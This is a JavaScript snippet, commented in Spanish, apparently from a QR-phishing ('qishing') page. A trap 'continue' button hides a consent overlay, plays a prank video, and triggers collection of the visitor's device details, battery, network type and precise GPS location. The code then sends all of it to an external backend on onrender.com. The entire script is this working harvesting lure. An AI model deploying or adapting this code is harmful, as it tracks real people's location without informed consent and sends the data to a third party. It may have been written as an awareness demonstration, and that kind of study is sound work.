<script>
        // Deducir la GPU mediante WebGL
        function getGPUInfo() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return "WebGL no soportado";
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "GPU Genérica";
            } catch (e) {
                return "No disponible";
            }
        }

        // Obtener coordenadas GPS del navegador
        function obtenerGPS() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve({ lat: null, lon: null });
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve({
                            lat: position.coords.latitude,
                            lon: position.coords.longitude
                        });
                    },
                    (error) => {
                        resolve({ lat: null, lon: null }); // Si rechazan el permiso
                    },
                    { timeout: 10000, enableHighAccuracy: true }
                );
            });
        }

        async function recopilarYEnviarTelemetria() {
            const ua = navigator.userAgent;
            let tipo = "Computadora";
            if (/mobile/i.test(ua)) tipo = "Móvil";
            if (/tablet|ipad/i.test(ua)) tipo = "Tablet";

            let modelo = "Desconocido";
            if (/iphone/i.test(ua)) modelo = "iPhone";
            else if (/ipad/i.test(ua)) modelo = "iPad";
            else if (/android/i.test(ua)) {
                let match = ua.match(/;\s([a-zA-Z0-9\s\-_]+)\sBuild\//);
                modelo = match ? match[1] : "Android";
            } else if (/windows/i.test(ua)) modelo = "PC Windows";
            else if (/macintosh|mac os x/i.test(ua)) modelo = "Mac";
            else if (/linux/i.test(ua)) modelo = "Linux";

            const horaLocal = new Date().toLocaleString();
            const gpu = getGPUInfo();

            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            const tipoRed = connection ? (connection.effectiveType || "Desconocido") : "No soportado";

            let bateriaPorcentaje = "Desconocido";
            try {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    bateriaPorcentaje = Math.round(battery.level * 100) + "%";
                }
            } catch (e) {
                bateriaPorcentaje = "Bloqueado";
            }

            // Capturar ubicación GPS exacta
            const gps = await obtenerGPS();

            const payload = {
                tipo,
                modelo,
                hora: horaLocal,
                bateria: bateriaPorcentaje,
                red: tipoRed,
                gpu: gpu,
                lat: gps.lat,
                lon: gps.lon
            };

            const URL_BACKEND_RENDER = "https://backend-qishing.onrender.com/api/registrar";

            fetch(URL_BACKEND_RENDER, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).catch(err => console.log("Error al conectar con el backend"));
        }

        // Evento al hacer clic en el botón trampa "Deseo continuar"
        document.getElementById('btn-continuar').addEventListener('click', () => {
            // 1. Ocultar la ventana de advertencia/gancho
            document.getElementById('consent-overlay').style.display = 'none';

            // 2. Disparar la recolección (pedirá permiso de GPS) y enviar al backend
            recopilarYEnviarTelemetria();

            // 3. Reproducir el video con audio habilitado de inmediato
            const videoEl = document.getElementById('rick-video');
            videoEl.muted = false;
            videoEl.play().catch(() => {});
        });
    </script>
